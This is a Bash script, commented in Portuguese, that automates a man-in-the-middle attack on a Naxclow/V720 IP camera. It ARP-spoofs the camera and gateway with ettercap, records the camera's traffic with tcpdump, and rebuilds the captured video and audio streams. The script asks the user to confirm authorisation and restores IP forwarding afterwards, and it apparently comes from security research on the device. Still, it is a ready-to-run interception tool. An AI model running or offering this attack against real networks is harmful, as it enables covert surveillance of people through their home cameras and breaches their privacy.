#!/usr/bin/env bash
#
# mitm_auto.sh — MITM automatizado contra uma câmera Naxclow/V720 na LAN.
# Encadeia: IP forwarding -> ARP spoof (ettercap) -> captura (tcpdump) por
# uma duração fixa -> remontagem de vídeo/áudio (extract_mitm_video.py).
#
#
# Uso:
#   sudo ./mitm_auto.sh <IP_CAMERA> [IP_GATEWAY] [IFACE] [DURACAO_S] [OUTDIR]
#
# Exemplo (o cenário que fizemos):
#   sudo ./mitm_auto.sh 192.168.0.36 192.168.0.1 en0 120 mitm_run
#
set -euo pipefail

CAM_IP="${1:-}"
GW_IP="${2:-192.168.0.1}"
IFACE="${3:-en0}"
DURATION="${4:-120}"
OUTDIR="${5:-mitm_run}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PCAP="${OUTDIR}/capture.pcap"

# ---- validações ----
if [[ -z "$CAM_IP" ]]; then
  echo "uso: sudo $0 <IP_CAMERA> [IP_GATEWAY] [IFACE] [DURACAO_S] [OUTDIR]" >&2
  exit 1
fi
if [[ "$EUID" -ne 0 ]]; then
  echo "[!] precisa de root (ARP spoof + IP forwarding). Corre com sudo." >&2
  exit 1
fi
for bin in ettercap tcpdump python3; do
  command -v "$bin" >/dev/null || { echo "[!] falta '$bin' no PATH" >&2; exit 1; }
done

# confirmação explícita — é ataque ativo
echo "=================================================================="
echo " MITM ATIVO"
echo "   câmera  (alvo)  : $CAM_IP"
echo "   gateway (alvo)  : $GW_IP"
echo "   interface       : $IFACE"
echo "   duração         : ${DURATION}s"
echo "   saída           : $OUTDIR/"
echo "=================================================================="
echo " Só prosseguir se ESTE equipamento e ESTA rede são teus / autorizados."
read -r -p " Digitar 'SIM' para continuar: " CONFIRM
[[ "$CONFIRM" == "SIM" ]] || { echo "abortado."; exit 1; }

mkdir -p "$OUTDIR"

# ---- estado original do IP forwarding, para restaurar no fim ----
ORIG_FWD="$(sysctl -n net.inet.ip.forwarding)"

ETTERCAP_PID=""
TCPDUMP_PID=""

cleanup() {
  echo
  echo "[*] a limpar..."
  # mata captura e ettercap (ettercap re-anuncia ARP correto ao sair limpo)
  [[ -n "$TCPDUMP_PID" ]]  && kill "$TCPDUMP_PID"  2>/dev/null || true
  [[ -n "$ETTERCAP_PID" ]] && kill -INT "$ETTERCAP_PID" 2>/dev/null || true
  sleep 3
  # restaura IP forwarding ao valor original
  sysctl -w net.inet.ip.forwarding="$ORIG_FWD" >/dev/null
  echo "[*] IP forwarding restaurado para $ORIG_FWD. ARP tables normalizam sozinhas."
}
trap cleanup EXIT INT TERM

# ---- 1. liga IP forwarding (senão a vítima perde conexão) ----
echo "[1/4] a ligar IP forwarding..."
sysctl -w net.inet.ip.forwarding=1 >/dev/null

# ---- 2. ARP spoof em background ----
echo "[2/4] a iniciar ARP spoof (ettercap)..."
ettercap -T -q -i "$IFACE" -M arp:remote "/$CAM_IP//" "/$GW_IP//" \
  >"$OUTDIR/ettercap.log" 2>&1 &
ETTERCAP_PID=$!
sleep 4   # deixa o envenenamento assentar antes de capturar
if ! kill -0 "$ETTERCAP_PID" 2>/dev/null; then
  echo "[!] ettercap morreu no arranque. Ver $OUTDIR/ettercap.log" >&2
  echo "    (no macOS novo o ettercap quebra com frequência; bettercap é alternativa)" >&2
  exit 1
fi

# ---- 3. captura só o tráfego da câmera, por DURATION segundos ----
echo "[3/4] a capturar ${DURATION}s em $PCAP (só host $CAM_IP)..."
tcpdump -i "$IFACE" -n "host $CAM_IP" -w "$PCAP" >/dev/null 2>&1 &
TCPDUMP_PID=$!
# espera a duração (ou CTRL-C interrompe e cai no cleanup)
SECS=0
while [[ $SECS -lt $DURATION ]]; do
  kill -0 "$ETTERCAP_PID" 2>/dev/null || { echo "[!] ettercap caiu durante a captura."; break; }
  sleep 2; SECS=$((SECS+2))
  printf "\r    %ds / %ds" "$SECS" "$DURATION"
done
echo

# para captura e spoof já (não esperar o EXIT trap para remontar limpo)
kill "$TCPDUMP_PID" 2>/dev/null || true; TCPDUMP_PID=""
kill -INT "$ETTERCAP_PID" 2>/dev/null || true; ETTERCAP_PID=""
sleep 2

# ---- 4. remonta vídeo/áudio ----
echo "[4/4] a remontar vídeo/áudio..."
if [[ ! -s "$PCAP" ]]; then
  echo "[!] pcap vazio — nada capturado. Câmera estava a emitir tráfego?" >&2
  exit 1
fi

# O extractor assume a câmera como origem do stream; passamos o IP dela.
python3 "$SCRIPT_DIR/extract_mitm_video.py" "$PCAP" --out "$OUTDIR" --cam-ip "$CAM_IP" || {
  echo "[i] Sem frames de vídeo no pcap."
  echo "    Em STA a câmera só emite vídeo quando o app abre o viewer."
  echo "    Control channel + MQTT continuam no pcap: $PCAP (abrir no Wireshark)."
}

echo
echo "[✓] concluído. Saída em: $OUTDIR/"
echo "    pcap        : $PCAP"
echo "    frames      : $OUTDIR/frames/*.jpg"
echo "    vídeo       : $OUTDIR/video.avi"
echo "    áudio (raw) : $OUTDIR/audio_g711.raw"
[[ -f "$OUTDIR/audio_g711.raw" ]] && command -v ffmpeg >/dev/null && {
  ffmpeg -y -f mulaw -ar 8000 -ac 1 -i "$OUTDIR/audio_g711.raw" "$OUTDIR/audio.wav" >/dev/null 2>&1 \
    && echo "    áudio (wav) : $OUTDIR/audio.wav"
}
